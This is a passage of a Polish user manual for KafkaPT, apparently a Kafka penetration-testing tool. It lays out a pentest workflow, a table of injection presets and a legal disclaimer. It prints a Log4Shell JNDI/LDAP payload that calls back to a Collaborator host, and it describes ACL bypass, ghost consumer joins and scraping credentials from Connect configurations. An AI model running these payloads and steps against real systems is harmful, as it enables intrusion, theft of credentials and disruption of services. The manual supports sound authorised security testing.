**Najpierw załaduj schemat** w CONFIG → SCHEMA. KafkaPT odczytuje strukturę schematu i generuje realistyczne losowe wartości dla każdego pola.

**Obsługiwane typy Avro:** null, boolean, int, long, float, double, string, bytes, array, map, enum, union, fixed i typy logiczne (uuid, date, time-millis, time-micros, timestamp-millis, timestamp-micros, decimal).

| Przycisk | Opis |
|---|---|
| **GENERATE RANDOM PAYLOAD** | Generuje jeden prawidłowy losowy ładunek JSON na podstawie załadowanego schematu. |
| **COPY JSON** | Kopiuje wygenerowany JSON do schowka. |
| **CLEAR** | Czyści wyświetlacz i resetuje licznik. |

W zakładce SEND ustaw **Payload Source** na `From Randomizer`. KafkaPT generuje świeży losowy ładunek dla każdej wysłanej wiadomości, serializuje go przez Avro i opakowuje w format Confluent wire format (magic byte + ID schematu).

---

## 16. Zakładka FINDINGS

**Co to jest:** Scentralizowany log każdej podatności i obserwacji zarejestrowanej podczas sesji testowej. Findingi są dodawane automatycznie przez inne zakładki — nie musisz ich ręcznie wprowadzać.

**Deduplikacja:** Jeśli ten sam finding zostanie wyzwolony wielokrotnie (np. wysłanie 20 wiadomości injekcji do tego samego topiku), rejestrowane jest tylko pierwsze wystąpienie.

#### Poziomy ważności:

| Ważność | Kolor | Znaczenie |
|---|---|---|
| **CRITICAL** | Czerwony | Natychmiastowe poważne ryzyko. Wildcard ACLe, bypass ACL, ghost consumer, callbacki Collaboratora. |
| **HIGH** | Pomarańczowy | Znaczące ryzyko. PII w plaintekście, credential w konfiguracji Connect, dostarczona injekcja, manipulacja offsetami. |
| **MEDIUM** | Żółty | Umiarkowane ryzyko. Nieautoryzowany dostęp do Kafka Connect API, ujawniona wrażliwa struktura schematu. |
| **LOW** | Zielony | Drobne problemy. Informacyjne ujawnienie z ograniczonym wpływem. |
| **INFO** | Morski | Obserwacje. Odkryte topiki, enumerowane grupy, znalezione schematy. |

#### Przyciski:

| Przycisk | Opis |
|---|---|
| **MARK FALSE POSITIVE** | Oznacza wybrany finding jako false positive. Pozostaje na liście i w raporcie z oznaczeniem `[FP]`. |
| **EXPORT MARKDOWN** | Zapisuje wszystkie findingi do pliku `.md` posortowanego według ważności. Użyj tego do generowania raportu z pentestów. |
| **CLEAR ALL** | Trwale usuwa wszystkie findingi (wymaga potwierdzenia). |

#### Lewy panel — lista findingów:
Posortowana według ważności (CRITICAL jako pierwsze). Kolumny: Ważność, Tytuł, Faza, Czas.

#### Prawy panel — widok szczegółów:
Pełne szczegóły wybranego findingu: ważność, tytuł, faza, timestamp, pełny opis ryzyka i surowy dowód.

---

## 17. Typowy przebieg testu penetracyjnego

### Faza 1 — Konfiguracja (zakładka ⚙ CONFIG)

1. Otwórz CONFIG → **CERTIFICATES**. Włącz mTLS dla brokera i SR jeśli potrzeba. Wczytaj pliki certyfikatów. Włącz SASL jeśli wymagany.
2. Otwórz CONFIG → **PROXY/BURP**. Włącz HTTP proxy jeśli routing przez Burp. Ustaw domenę Collaboratora. Wpisz Poll Server i BIID, kliknij **START POLLING**.
3. Otwórz CONFIG → **SCHEMA**. Wpisz URL Schema Registry. Pobierz schemat ID `1`.

### Faza 2 — Rozpoznanie (zakładka RECON)

4. Wpisz adres brokera. Kliknij **RUN ALL**.
5. Zanotuj nazwy topików w TOPOLOGY.
6. Zanotuj ID grup konsumentów w GROUPS.
7. Sprawdź ACLS pod kątem czerwonych (wildcard) wpisów.
8. Wróć do SCHEMA: spróbuj IDs 1–5 ręcznie, następnie enumeruj zakres 1–200.

### Faza 3 — Bezpieczeństwo danych (zakładka READ)

9. Wpisz broker, topik (z kroku 5), grupę `kafkapt-consumer`.
10. Ustaw offset `earliest`, max wiadomości `20`. Kliknij **READ MESSAGE(S)**.
11. Przejrzyj wiadomości w panelu szczegółów pod kątem wrażliwej zawartości.
12. Kliknij **EXPORT NDJSON** aby zebrać dowody.

### Faza 4 — Injekcja (ATTACK → HEADER INJECT)

13. Wpisz broker i topik, do którego możesz pisać.
14. Kliknij **+** aby dodać wiersz. Wybierz preset `Log4Shell — JNDI/LDAP`.
15. Kliknij **INJECT**. Monitoruj zakładkę FINDINGS pod kątem callbacków Collaboratora.
16. Powtórz z presetami `SSRF — AWS metadata` i `SSTI — Jinja2`.
17. Zmieniaj nazwy nagłówków (`User-Agent`, `X-Forwarded-For`, `X-Trace-ID`).

### Faza 5 — Autoryzacja (ATTACK → ACL BYPASS)

18. Wpisz topik z RECON, do którego nie powinieneś mieć dostępu.
19. Kliknij **TEST READ**. Zanotuj wynik.
20. Kliknij **TEST WRITE**. Zanotuj wynik.
21. Wpisz ID grupy z RECON. Kliknij **GHOST JOIN** (potwierdź dialog).

### Faza 6 — Kafka Connect (zakładka CONNECT)

22. Wpisz URL serwera Connect (spróbuj port 8083).
23. Kliknij **LIST CONNECTORS** (najpierw bez poświadczeń — test dostępu nieautoryzowanego).
24. Kliknij **FULL SCAN** aby pobrać wszystkie konfiguracje i przeskanować credentiale.
25. Kliknij każdy connector w drzewie aby przejrzeć annotowaną konfigurację.

### Faza 7 — Raport (zakładka FINDINGS)

26. Przejrzyj wszystkie findingi. Oznacz false positives.
27. Kliknij **EXPORT MARKDOWN** aby wygenerować raport.

---

## 18. Opis presetów injekcji

| Preset | Typ ataku | Co wykrywa |
|---|---|---|
| `Log4Shell — JNDI/LDAP` | Zdalne wykonanie kodu | Log4j2 przetwarza nagłówek i wykonuje wychodzący request LDAP do Collaboratora |
| `Log4Shell — JNDI/RMI` | Zdalne wykonanie kodu | To samo przez protokół RMI |
| `Log4Shell — JNDI/DNS` | Wykrycie poza-pasmowe | Prostszy test Log4Shell — tylko lookup DNS, trudniejszy do zablokowania |
| `SSTI — Jinja2` | Injekcja szablonów | Jinja2 ewaluuje `{{7*7}}` → odpowiedź zawiera `49` |
| `SSTI — FreeMarker` | Injekcja szablonów | FreeMarker ewaluuje `${7*7}` |
| `SQLi — Error-based` | Injekcja SQL | Baza danych zwraca błąd zawierający informacje o wersji |
| `SQLi — Union` | Injekcja SQL | Próba ekstrakcji danych przez union |
| `XSS — Script tag` | Cross-site scripting | Wartość nagłówka odbita bez sanityzacji w interfejsie webowym |
| `XSS — Img onerror` | Cross-site scripting | Alternatywny wektor XSS |
| `Command Injection` | Injekcja poleceń OS | Wartość przekazana do `exec()` lub powłoki bez sanityzacji |
| `Path Traversal` | Przemierzanie katalogów | Wartość dociera do operacji na ścieżce pliku |
| `SSRF — AWS metadata` | SSRF po stronie serwera | Serwer przetwarzający pobiera wewnętrzne metadane AWS |
| `SSRF — Internal` | SSRF | Wewnętrzny aktuator Spring Boot jest dostępny |
| `XXE` | Zewnętrzna jednostka XML | Parser XML przetwarza zewnętrzne encje |
| `Null byte` | Sanityzacja wejść | Bajt null powoduje nieoczekiwane zachowanie lub truncation |
| `Large value (1 KB)` | Testowanie bufora / DoS | Wartość nagłówka 1 KB wywołuje błędy lub truncation |

**Podstawianie COLLAB:** Ustaw domenę Collaboratora w CONFIG → PROXY/BURP. Gdy stosujesz preset, `COLLAB` jest zastępowany:
```
${jndi:ldap://COLLAB/a}  →  ${jndi:ldap://abc123.collab.internal/a}
```

---

## 19. Rozumienie findingów

Każdy finding zawiera:

| Pole | Opis |
|---|---|
| **Severity (Ważność)** | CRITICAL / HIGH / MEDIUM / LOW / INFO |
| **Title (Tytuł)** | Krótki opis co zostało znalezione |
| **Phase (Faza)** | Która faza testu go znalazła: `recon`, `authz`, `injection`, `data`, `infra` |
| **Time (Czas)** | Timestamp UTC |
| **Description (Opis)** | Pełne wyjaśnienie ryzyka i jego wpływu biznesowego |
| **Evidence (Dowód)** | Surowe dane potwierdzające finding |

**Co robić z każdą ważnością:**

| Ważność | Działanie |
|---|---|
| CRITICAL | Raportuj natychmiast. Wstrzymaj testy i powiadom właściciela systemu. |
| HIGH | Prominentnie w raporcie. Wymaga natychmiastowej remediacji. |
| MEDIUM | W raporcie. Remediacja w następnym sprincie. |
| LOW | W raporcie. Zaplanuj remediację. |
| INFO | Jako kontekst informacyjny. Samo w sobie nie jest podatnością. |

---

## 20. Eksport wyników

### Raport findingów (Markdown)

1. Przejdź do zakładki **FINDINGS**.
2. Kliknij **EXPORT MARKDOWN**.
3. Wybierz ścieżkę zapisu. Plik `.md` jest posortowany według ważności z pełnymi opisami i dowodami.

### Dowody wiadomości (NDJSON)

1. Przejdź do zakładki **READ** po skonsumowaniu wiadomości.
2. Kliknij **EXPORT NDJSON**.
3. Każda linia w pliku to kompletny rekord JSON zawierający: topik, partycję, offset, timestamp, nagłówki Kafka (jako pary nazwa/wartość), zdekodowaną wartość i surowe bajty hex.

---

## 21. Rozwiązywanie problemów

**`confluent-kafka not installed`**
```bash
pip install confluent-kafka
```

**`fastavro not installed`**
```bash
pip install fastavro
```

**Nie można połączyć się z brokerem**
- Sprawdź adres i port brokera (`9092` dla plain, `9093` dla SSL).
- Dla mTLS: zweryfikuj że wszystkie trzy pliki certyfikatów są wybrane.
- Spróbuj odznaczenia **Verify server certificate** jeśli używasz certyfikatów samopodpisanych.
- Sprawdź reguły firewalla — Twój adres IP musi mieć dostęp do portu brokera.

**Pobieranie schematu zwraca HTTP 404**
- Schema ID nie istnieje. Spróbuj IDs `1`, `2`, `3`.
- Użyj funkcji **ENUMERATE** aby znaleźć które ID istnieją.

**RECON nie pokazuje topików**
- Certyfikat może nie mieć uprawnień `DESCRIBE` dla żadnych topików.
- Sprawdź czy log pokazuje `TOPIC_AUTHORIZATION_FAILED` — sama ta informacja jest wartościowa pentestersko.

**Test proxy Burp nie działa**
- Upewnij się że Burp Suite działa i jego listener Proxy jest włączony.
- Sprawdź że port w KafkaPT zgadza się z portem listenera Burp (domyślnie 8080).
- Kliknij **TEST** w CONFIG → PROXY/BURP dla komunikatu diagnostycznego.

**Wiadomości wyświetlają się jako hex / nieczytelne bajty**
- Najpierw załaduj właściwy schemat w CONFIG → SCHEMA.
- Lub zaznacz **Ignore schema** w widoku szczegółów READ i ustaw **Display as** na `auto-detect` lub `UTF-8 raw`.

**Font za mały na ekranie 4K**
- Zmień combo **Font:** w pasku nagłówka z `100%` na `125%`, `150%` lub `175%`.

**Błąd wersji Pythona**
KafkaPT wymaga Python 3.11 lub nowszego:
```bash
python3 --version
```

---

## 22. Zastrzeżenie prawne

**To narzędzie jest dostarczone wyłącznie do autoryzowanych testów bezpieczeństwa i badań.**

- Musisz mieć **jawne pisemne pozwolenie** od właściciela systemu zanim zaczniesz testować jakiekolwiek środowisko Kafka tym narzędziem.
- Nieautoryzowany dostęp do systemów komputerowych jest nielegalny w większości jurysdykcji (np. Ustawa o cyberbezpieczeństwie w Polsce, Computer Fraud and Abuse Act w USA, Computer Misuse Act w Wielkiej Brytanii).
- Autorzy KafkaPT nie ponoszą żadnej odpowiedzialności za nieautoryzowane lub nielegalne użycie tego oprogramowania.
- Zawsze działaj w ramach uzgodnionego zakresu zlecenia testów penetracyjnych.
- Funkcje `OFFSET ATTACK` i `GHOST JOIN` mogą zakłócać serwisy produkcyjne. Używaj wyłącznie w izolowanych środowiskach testowych lub z jawną, udokumentowaną autoryzacją.
- Funkcja `FULL SCAN` w zakładce CONNECT odczytuje konfiguracje connectorów, które mogą zawierać produkcyjne poświadczenia. Przetwarzaj przechwycone dane zgodnie z polityką obsługi danych Twojego zlecenia.

**Używaj odpowiedzialnie. Testuj etycznie.**

---

*KafkaPT v2.5 — opracowany dla społeczności badaczy bezpieczeństwa.*
